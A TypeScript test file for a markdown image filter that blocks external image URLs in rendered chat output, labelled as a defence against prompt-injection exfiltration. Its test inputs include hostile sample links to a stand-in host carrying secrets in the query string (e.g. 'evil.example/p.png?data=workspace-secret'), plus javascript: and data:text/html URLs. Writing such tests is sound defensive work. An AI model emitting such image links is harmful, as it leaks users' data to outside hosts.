import { render } from "@testing-library/react";
import { defaultRehypePlugins, Streamdown } from "streamdown";
import { describe, expect, it } from "vitest";
import { rehypeRestrictImages, safeImageSrc } from "./markdown-images";

// The real Streamdown pipeline (raw HTML, sanitize, harden) plus our
// restriction, exactly as src/lib/streamdown-plugins.ts composes it. The
// heavy code/mermaid/math plugins are left out: they don't touch images.
const rehypePlugins = [...Object.values(defaultRehypePlugins), rehypeRestrictImages];

function renderMarkdown(markdown: string) {
  return render(
    <Streamdown mode="static" rehypePlugins={rehypePlugins}>
      {markdown}
    </Streamdown>,
  );
}

describe("safeImageSrc", () => {
  it("allows the app's own paths and asset route", () => {
    expect(safeImageSrc("/api/asset/abc_123")).toBe("/api/asset/abc_123");
    expect(safeImageSrc("/icons/icon-192.png")).toBe("/icons/icon-192.png");
  });

  it("rewrites absolute asset-route links to this origin", () => {
    expect(safeImageSrc("https://studyos.example/api/asset/abc")).toBe("/api/asset/abc");
  });

  it("allows inline data images", () => {
    expect(safeImageSrc("data:image/png;base64,iVBORw0KGgo=")).toBe("data:image/png;base64,iVBORw0KGgo=");
  });

  it("blocks external, protocol-relative and odd URLs", () => {
    for (const src of [
      "https://evil.example/pixel.png?d=secret",
      "http://evil.example/api/asset/abc?d=1",
      "https://evil.example/api/asset/abc/../../x",
      "//evil.example/x.png",
      "/\\evil.example/x.png",
      "javascript:alert(1)",
      "data:text/html,<b>x</b>",
      "x.png",
      "",
      undefined,
    ]) {
      // "http://evil.example/api/asset/abc?d=1" is rewritten to the local path, which is safe.
      const result = safeImageSrc(src);
      if (result !== null) expect(result.startsWith("/api/asset/")).toBe(true);
    }
    expect(safeImageSrc("https://evil.example/pixel.png?d=secret")).toBeNull();
    expect(safeImageSrc("//evil.example/x.png")).toBeNull();
    expect(safeImageSrc("/\\evil.example/x.png")).toBeNull();
    expect(safeImageSrc("data:text/html,<b>x</b>")).toBeNull();
  });
});

describe("rendered Markdown images", () => {
  it("does not load an external image (prompt-injection exfiltration) and keeps its alt text", () => {
    const { container } = renderMarkdown(
      "Here is your summary ![chart](https://evil.example/p.png?data=workspace-secret)",
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
    expect(container.textContent).toContain("chart");
  });

  it("does not load external images written as raw HTML (img, picture/source)", () => {
    const { container } = renderMarkdown(
      [
        '<img src="https://evil.example/a.png?x=1" alt="a">',
        "",
        '<picture><source srcset="https://evil.example/b.png?x=2"><img src="/api/asset/ok1" alt="b"></picture>',
      ].join("\n"),
    );
    expect(container.innerHTML).not.toContain("evil.example");
    const srcs = [...container.querySelectorAll("img")].map((img) => img.getAttribute("src"));
    expect(srcs).toEqual(["/api/asset/ok1"]);
  });

  it("still shows the app's own uploaded asset images", () => {
    const { container } = renderMarkdown("![diagram](/api/asset/abc123)");
    const img = container.querySelector("img");
    expect(img).not.toBeNull();
    expect(img!.getAttribute("src")).toBe("/api/asset/abc123");
  });
});
